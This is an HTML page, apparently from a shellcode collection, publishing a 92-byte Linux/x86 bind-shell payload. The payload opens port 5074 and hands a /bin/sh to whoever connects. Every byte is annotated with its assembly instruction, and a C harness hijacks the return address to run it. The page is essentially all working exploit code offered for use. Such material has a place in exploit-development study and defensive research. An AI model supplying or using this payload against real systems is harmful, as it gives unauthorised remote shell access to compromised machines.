<html><head><title>Linux/x86 - portbind a shell in port 5074 - 92 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
 * s0t4ipv6@Shellcode.com.ar
 * x86 portbind a shell in port 5074
 * 92 bytes.
 *
 */

char shellcode[] =
&quot;\x31\xc0&quot;			// xorl		%eax,%eax
&quot;\x50&quot;				// pushl	%eax
&quot;\x40&quot;				// incl		%eax
&quot;\x89\xc3&quot;			// movl		%eax,%ebx
&quot;\x50&quot;				// pushl	%eax
&quot;\x40&quot;				// incl		%eax
&quot;\x50&quot;				// pushl	%eax
&quot;\x89\xe1&quot;			// movl		%esp,%ecx
&quot;\xb0\x66&quot;			// movb		$0x66,%al
&quot;\xcd\x80&quot;			// int		$0x80
&quot;\x31\xd2&quot;			// xorl		%edx,%edx
&quot;\x52&quot;				// pushl	%edx
&quot;\x66\x68\x13\xd2&quot;		// pushw	$0xd213
&quot;\x43&quot;				// incl		%ebx
&quot;\x66\x53&quot;			// pushw	%bx
&quot;\x89\xe1&quot;			// movl		%esp,%ecx
&quot;\x6a\x10&quot;			// pushl	$0x10
&quot;\x51&quot;				// pushl	%ecx
&quot;\x50&quot;				// pushl	%eax
&quot;\x89\xe1&quot;			// movl		%esp,%ecx
&quot;\xb0\x66&quot;			// movb		$0x66,%al
&quot;\xcd\x80&quot;			// int		$0x80
&quot;\x40&quot;				// incl		%eax
&quot;\x89\x44\x24\x04&quot;		// movl		%eax,0x4(%esp,1)
&quot;\x43&quot;				// incl		%ebx
&quot;\x43&quot;				// incl		%ebx
&quot;\xb0\x66&quot;			// movb		$0x66,%al
&quot;\xcd\x80&quot;			// int		$0x80
&quot;\x83\xc4\x0c&quot;			// addl		$0xc,%esp
&quot;\x52&quot;				// pushl	%edx
&quot;\x52&quot;				// pushl	%edx
&quot;\x43&quot;				// incl		%ebx
&quot;\xb0\x66&quot;			// movb		$0x66,%al
&quot;\xcd\x80&quot;			// int		$0x80
&quot;\x93&quot;				// xchgl	%eax,%ebx
&quot;\x89\xd1&quot;			// movl		%edx,%ecx
&quot;\xb0\x3f&quot;			// movb		$0x3f,%al
&quot;\xcd\x80&quot;			// int		$0x80
&quot;\x41&quot;				// incl		%ecx
&quot;\x80\xf9\x03&quot;			// cmpb		$0x3,%cl
&quot;\x75\xf6&quot;			// jnz		&lt;shellcode+0x40&gt;
&quot;\x52&quot;				// pushl	%edx
&quot;\x68\x6e\x2f\x73\x68&quot;		// pushl	$0x68732f6e
&quot;\x68\x2f\x2f\x62\x69&quot;		// pushl	$0x69622f2f
&quot;\x89\xe3&quot;			// movl		%esp,%ebx
&quot;\x52&quot;				// pushl	%edx
&quot;\x53&quot;				// pushl	%ebx
&quot;\x89\xe1&quot;			// movl		%esp,%ecx
&quot;\xb0\x0b&quot;			// movb		$0xb,%al
&quot;\xcd\x80&quot;			// int		$0x80
;

main() {
        int *ret;
        ret=(int *)&amp;ret +2;
        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(shellcode));
        (*ret) = (int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
